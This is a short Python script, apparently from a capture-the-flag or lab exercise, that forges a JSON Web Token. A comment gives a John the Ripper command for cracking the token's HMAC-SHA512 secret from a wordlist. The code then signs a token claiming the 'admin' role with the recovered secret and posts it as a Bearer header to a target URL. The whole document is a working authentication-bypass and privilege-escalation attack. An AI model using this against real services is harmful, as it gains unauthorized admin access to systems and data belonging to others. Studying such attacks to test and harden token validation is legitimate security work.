import jwt
import requests
import sys

#  ~/apps/JohnTheRipper/run/john --wordlist=mylist.txt --format=HMAC-SHA512 jwt59.txt

public = open(sys.argv[1], 'r').read()
t = jwt.encode({"role": "admin"}, 'sekret',
               algorithm='HS512')

url = sys.argv[2]

headers = {'Authorization':
           'Bearer ' + t.decode('utf-8')}
print(headers['Authorization'])
r = requests.post(url, headers=headers)
print(r.content)
